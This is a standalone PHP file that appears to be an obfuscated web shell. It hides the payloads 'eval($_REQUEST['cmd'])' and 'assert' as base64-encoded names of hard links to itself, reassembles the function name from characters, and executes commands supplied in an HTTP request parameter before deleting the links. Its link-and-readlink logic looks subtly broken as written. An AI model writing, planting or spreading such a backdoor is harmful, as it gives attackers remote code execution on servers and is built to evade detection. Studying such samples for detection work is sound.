<?php
link(__FILE__, 'ZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsK');
link(__FILE__, 'YXNzZXJ0Cg==');
$d = substr(readlink('ZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsK'), -32);
$e = substr(readlink('YXNzZXJ0Cg=='), -12);
$e = base64_decode($e);
//$e(base64_decode($d).';');
$b = $e[0].'ssert';
$b(base64_decode($d));
unlink('ZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsK');
unlink('YXNzZXJ0Cg==');